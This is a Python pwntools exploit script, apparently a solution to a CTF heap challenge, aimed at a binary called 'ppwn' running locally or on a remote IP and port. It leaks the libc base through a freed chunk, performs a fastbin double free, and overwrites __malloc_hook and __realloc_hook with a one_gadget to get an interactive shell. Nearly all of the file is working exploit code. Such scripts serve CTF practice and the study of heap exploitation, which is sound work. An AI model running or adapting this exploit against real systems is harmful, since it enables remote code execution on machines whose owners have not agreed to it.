#!/usr/bin/env python
from pwn import *

# https://n0nop.com/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./ppwn')
    offset = 0x3c4b20
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31015)
    offset = 0x3c4b20
    libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')

def choice(c):
    p.recvuntil('\n-------')
    p.sendline(str(c))

def leave():
    choice(1)

def delete(slp=False):
    choice(2)
    if slp:
        sleep(2)

def show():
    choice(3)

def create(sz, data):
    choice(4)
    p.recvuntil('size:\n')
    p.sendline(str(sz))
    p.recvuntil('content:\n')
    p.send(data)

# leak libc
create(0xf8, 'A')
create(0x8, 'B')
delete()
show()
p.recvuntil('Item0:\n')
main_arena = u64(p.recv(6).ljust(8, '\x00')) - 0x58
info('main_arena = ' + hex(main_arena))
libc_base = main_arena - offset
info('libc_base = ' + hex(libc_base))
sleep(2)

# double free
create(0x68, 'A')
create(0x68, 'B')
delete()
delete(slp=True)

free_hook = libc_base + libc.symbols['__free_hook']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
system = libc_base + libc.symbols['system']
realloc = libc_base + libc.symbols['realloc']
realloc_hook = libc_base + libc.symbols['__realloc_hook']
if local:
    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    one_gadget = libc_base + one_gadgets[1]
else:
    one_gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1207]
    one_gadget = libc_base + one_gadgets[1]
info('one_gadget = ' + hex(one_gadget))

# write __malloc_hook & __realloc_hook
create(0x68, p64(realloc_hook - 0x1b))
create(0x68, 'A')
create(0x68, 'B')
create(0x68, (p64(one_gadget) + p64(realloc + 2)).rjust(0x1b, '\x00'))

# get shell
delete(slp=True)

#gdb.attach(p)

p.interactive()

